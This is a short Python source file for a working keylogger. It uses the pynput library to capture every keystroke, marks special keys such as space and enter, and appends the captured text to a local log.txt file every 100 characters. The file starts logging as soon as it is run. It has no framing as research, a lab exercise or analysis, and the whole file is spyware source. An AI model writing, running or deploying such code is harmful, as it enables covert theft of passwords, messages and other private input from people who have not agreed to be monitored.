import os
import time
import random

def keylogger():
    import pynput
    log = ""

    def on_press(key):
        nonlocal log
        try:
            log += key.char
        except:
            if key == pynput.keyboard.Key.space:
                log += " "
            elif key == pynput.keyboard.Key.enter:
                log += "\n"
            else:
                log += f"[{key}]"
        if len(log) > 100:
            with open("log.txt", "a") as f:
                f.write(log)
            log = ""

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

keylogger()
